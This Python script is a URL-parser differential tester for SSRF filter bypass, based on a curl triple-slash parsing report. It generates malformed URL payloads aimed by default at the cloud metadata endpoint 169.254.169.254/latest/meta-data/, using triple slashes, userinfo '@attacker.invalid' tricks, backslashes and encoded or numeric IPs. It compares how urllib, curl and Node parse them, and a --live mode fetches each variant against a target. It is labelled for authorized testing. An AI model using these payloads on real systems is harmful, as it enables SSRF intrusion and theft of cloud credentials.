#!/usr/bin/env python3
"""
url_parser_diff.py - URL parser differential tester for SSRF filter bypass.

Based on HackerOne #3923212 (curl URL API triple-slash):
  libcurl parses "http:///169.254.169.254/latest/meta-data/" as
  host="169.254.169.254", path="/latest/meta-data/" -- but per RFC 3986 the
  authority is EMPTY and the whole thing is the path. Applications validating
  the hostname via curl_url_get(CURLUPART_HOST) can be tricked into SSRF.
  curl CLI oracle:  curl -w "%{url_effective}" http:///path  ->  http://path/
  curl's fix: CURLU_NO_AUTHORITY (PR #22313).

This tool generates malformed URL variants and compares how each available
parser resolves them:
  - python  : urllib.parse (RFC 3986-ish)
  - curl    : libcurl/CURLU via the curl CLI (%{url_effective})
  - node    : WHATWG URL (if node is installed)

Any variant where parsers disagree on scheme/host/path is a candidate for an
SSRF filter bypass. Authorized testing only.

Usage:
  python3 url_parser_diff.py                                  # default corpus vs 169.254.169.254
  python3 url_parser_diff.py --ip 10.0.0.1 --path /internal/health
  python3 url_parser_diff.py --url 'http:///169.254.169.254/latest/meta-data/'
  python3 url_parser_diff.py --only-interesting
  python3 url_parser_diff.py --live --timeout 5 --follow-redirects
  python3 url_parser_diff.py --json
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import shutil
import subprocess
import sys
import urllib.parse
from typing import Optional

DEFAULT_IP = "169.254.169.254"
DEFAULT_PATH = "/latest/meta-data/"


# ---------------------------------------------------------------- parsers

def py_parse(url: str) -> dict:
    """Python urllib.parse -- closest to RFC 3986 behavior in stdlib."""
    try:
        r = urllib.parse.urlsplit(url)
        try:
            port = r.port
        except ValueError:
            port = "invalid"
        return {
            "scheme": r.scheme or "",
            "host": r.hostname or "",
            "port": port,
            "path": r.path or "",
        }
    except Exception as e:  # pragma: no cover
        return {"error": str(e)[:80]}


def curl_parse(url: str, timeout: int) -> dict:
    """libcurl oracle via the CLI. Performs a real request attempt (bounded)."""
    if shutil.which("curl") is None:
        return {"error": "curl not installed"}
    try:
        p = subprocess.run(
            ["curl", "-sS", "-o", "/dev/null", "-w", "%{url_effective}",
             "--connect-timeout", str(min(2, timeout)), "--max-time", str(timeout),
             url],
            capture_output=True, text=True, timeout=timeout + 5,
        )
        out = p.stdout.strip()
        if out:
            e = urllib.parse.urlsplit(out)
            return {"effective": out, "host": e.hostname or "", "path": e.path or ""}
        err = (p.stderr or "").strip().splitlines()
        return {"error": (err[0] if err else f"rc={p.returncode}")[:80]}
    except subprocess.TimeoutExpired:
        return {"error": "timeout"}


def node_parse(url: str) -> dict:
    """WHATWG URL via Node.js (if installed)."""
    if shutil.which("node") is None:
        return {"error": "node not installed"}
    script = (
        "const u=new URL(process.argv[1]);"
        "console.log(JSON.stringify({host:u.hostname,port:u.port,"
        "path:u.pathname,href:u.href}));"
    )
    try:
        p = subprocess.run(["node", "-e", script, url],
                           capture_output=True, text=True, timeout=10)
        if p.returncode != 0:
            err = (p.stderr or "").strip().splitlines()
            return {"error": (err[-1] if err else "invalid URL")[:80]}
        return json.loads(p.stdout.strip())
    except Exception as e:
        return {"error": str(e)[:80]}


# ------------------------------------------------------------- IP helpers

def _addr(ip: str) -> Optional[ipaddress.IPv4Address]:
    try:
        return ipaddress.IPv4Address(ip)
    except ipaddress.AddressValueError:
        return None


def percent_encode_ip(ip: str) -> str:
    return ".".join(f"%{ord(o):02x}" for o in ip.split("."))


def numeric_variants(ip: str) -> list[tuple[str, str]]:
    a = _addr(ip)
    if a is None:
        return []
    n = int(a)
    o = str(a).split(".")
    return [
        ("decimal-ip", str(n)),
        ("hex-ip", hex(n)),
        ("octal-dotted", ".".join(f"0{int(x):o}" for x in o)),
        ("ipv4-mapped-v6", f"[::ffff:{int(o[0]):x}:{int(o[1]):x}:{int(o[2]):x}:{int(o[3]):x}]"),
    ]


# ----------------------------------------------------------- variant corpus

def gen_variants(ip: str, path: str) -> list[tuple[str, str]]:
    if not path.startswith("/"):
        path = "/" + path
    full = f"{ip}{path}"
    BS = chr(92)  # backslash
    variants: list[tuple[str, str]] = []
    add = lambda name, u: variants.append((name, u))

    add("baseline", f"http://{full}")
    add("triple-slash", f"http:///{full}")                     # H1 #3923212
    add("quad-slash", f"http:////{full}")
    add("penta-slash", f"http://///{full}")
    add("scheme-relative-noslash", f"http:{path}")
    add("single-slash", f"http:/{full}")
    add("backslash-authority", f"http:{BS}{BS}{full.replace('/', BS)}")
    add("backslash-first-sep", f"http://{ip}{BS}{path[1:]}")   # http://ip\path
    add("userinfo-at", f"http://attacker.invalid@{full}")
    add("userinfo-encoded-at", f"http://attacker.invalid%40{full}")
    add("backslash-at", f"http://{ip}{BS}@attacker.invalid{path}")
    add("port-userinfo", f"http://{ip}:80@attacker.invalid{path}")
    add("fragment-trick", f"http://{ip}/#{path}")
    add("fragment-before-at", f"http://{ip}#@attacker.invalid{path}")
    add("encoded-fragment", f"http://{ip}%23@attacker.invalid{path}")
    add("encoded-ip", f"http://{percent_encode_ip(ip)}{path}")
    add("encoded-slash", f"http://{ip}{path.replace('/', '%2f', 1)}")
    add("trailing-dot", f"http://{ip}.{path}")
    add("semicolon-params", f"http://{ip};@attacker.invalid{path}")
    add("colon-port", f"http://{ip}:80{path}")
    add("nonstandard-port", f"http://{ip}:65537{path}")
    add("space-encoded", f"http://{ip}%20{path}")
    add("https-triple", f"https:///{full}")
    add("ftp-triple", f"ftp:///{full}")
    for name, host in numeric_variants(ip):
        add(name, f"http://{host}{path}")
    return variants


# ------------------------------------------------------------ diff analysis

def parse_all(url: str, opts) -> dict:
    res = {"url": url, "python": py_parse(url)}
    if not opts.skip_curl:
        res["curl"] = curl_parse(url, opts.timeout)
    if not opts.skip_node:
        res["node"] = node_parse(url)
    return res


def host_of(entry: dict) -> str:
    if not entry or "error" in entry:
        return ""
    return (entry.get("host") or "").lower()


def reasons_for(res: dict) -> list[str]:
    reasons: list[str] = []
    hosts = {p: host_of(res.get(p)) for p in ("python", "curl", "node")}
    hosts = {p: h for p, h in hosts.items() if h}
    if len(set(hosts.values())) > 1:
        reasons.append("HOST DISAGREEMENT")
    py = res.get("python") or {}
    if py.get("host") == "" and any(hosts.values()):
        reasons.append("empty-authority confusion")
    if any("error" in (res.get(p) or {}) for p in ("curl", "node")):
        reasons.append("parser error (accept/reject asymmetry)")
    return reasons


# ------------------------------------------------------------------- main

def main() -> None:
    ap = argparse.ArgumentParser(description="URL parser differential tester (authorized testing only)")
    ap.add_argument("--ip", default=DEFAULT_IP, help="Target host for the corpus")
    ap.add_argument("--path", default=DEFAULT_PATH, help="Path appended to the target host")
    ap.add_argument("--url", help="Parse a single custom URL instead of the corpus")
    ap.add_argument("--only-interesting", action="store_true", help="Show only rows with parser disagreement")
    ap.add_argument("--skip-curl", action="store_true", help="Skip the curl/libcurl oracle")
    ap.add_argument("--skip-node", action="store_true", help="Skip the Node WHATWG oracle")
    ap.add_argument("--timeout", type=int, default=5, help="Per-request timeout (s)")
    ap.add_argument("--live", action="store_true", help="Actually fetch candidates with curl (authorized targets only)")
    ap.add_argument("--follow-redirects", action="store_true", help="Follow redirects in --live mode")
    ap.add_argument("--json", action="store_true", help="Dump full results as JSON")
    args = ap.parse_args()

    if args.url:
        variants = [("custom", args.url)]
    else:
        variants = gen_variants(args.ip, args.path)

    results = []
    interesting_rows = []

    for name, u in variants:
        res = parse_all(u, args)
        reasons = reasons_for(res)
        res["name"] = name
        res["reasons"] = reasons
        results.append(res)
        if reasons:
            interesting_rows.append(res)

    if args.json:
        print(json.dumps(results, indent=2))
        return

    def cell(entry: dict) -> str:
        if not entry or "error" in entry:
            return "-"
        h = entry.get("host", "")
        p = entry.get("path", "")
        return f"{h}{p}" if p.startswith("/") else f"{h} {p}"

    print(f"{'variant':<24} {'python':<34} {'curl':<34} {'node':<34} flags")
    print("-" * 150)
    for res in results:
        if args.only_interesting and not res["reasons"]:
            continue
        flag = ",".join(res["reasons"]) or ""
        print(f"{res['name']:<24} {cell(res.get('python')):<34} "
              f"{cell(res.get('curl')):<34} {cell(res.get('node')):<34} {flag}")
        if not args.only_interesting:
            print(f"{'':<24} {res['url']}")
    print("-" * 150)

    if interesting_rows:
        print(f"\n[+] {len(interesting_rows)} candidate variant(s) with parser disagreement:")
        for res in interesting_rows:
            print(f"    {res['name']:<24} {res['url']}")
            print(f"    {'':<24} reasons: {', '.join(res['reasons'])}")
        print("\n    Next: submit these variants to the target's URL-validation layer and")
        print("    compare the validator's verdict against the fetcher's real request.")
    else:
        print("\n[-] No parser disagreement found in this corpus for the available parsers.")

    if args.live:
        print("\n[!] --live mode: fetching each candidate (AUTHORIZED TARGETS ONLY)\n")
        for name, u in variants:
            cmd = ["curl", "-sS", "-o", "/dev/null",
                   "-w", "http=%{http_code} ip=%{remote_ip} eff=%{url_effective}",
                   "--max-time", str(args.timeout)]
            if args.follow_redirects:
                cmd.append("-L")
            cmd.append(u)
            try:
                p = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=args.timeout + 5)
                print(f"{name:<24} {p.stdout.strip() or (p.stderr or '').strip().splitlines()[-1][:60]}")
            except subprocess.TimeoutExpired:
                print(f"{name:<24} TIMEOUT")


if __name__ == "__main__":
    main()